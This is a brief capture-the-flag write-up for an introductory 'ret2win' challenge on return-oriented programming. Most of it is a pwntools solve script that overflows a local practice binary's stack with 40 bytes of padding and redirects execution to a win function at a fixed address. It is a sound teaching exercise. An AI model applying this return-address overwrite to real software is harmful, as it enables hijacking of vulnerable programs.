# Challenge Theory and Solution
This is a simple ret2win pwnchallenge, which servers as intro to rop chains.
It is simple to solve:
## Solve Script:
```python
#!/usr/bin/python3
import pwn
binary = "ret2win"
pwn.context.binary = binary
pwn.context.encoding = "latin"
pwn.context.log_level = "debug"

padding = 40
win = pwn.p64(0x400756)
payload = b"A"*padding + win

with pwn.process(binary) as io:
    io.send(payload)
    io.interactive()
```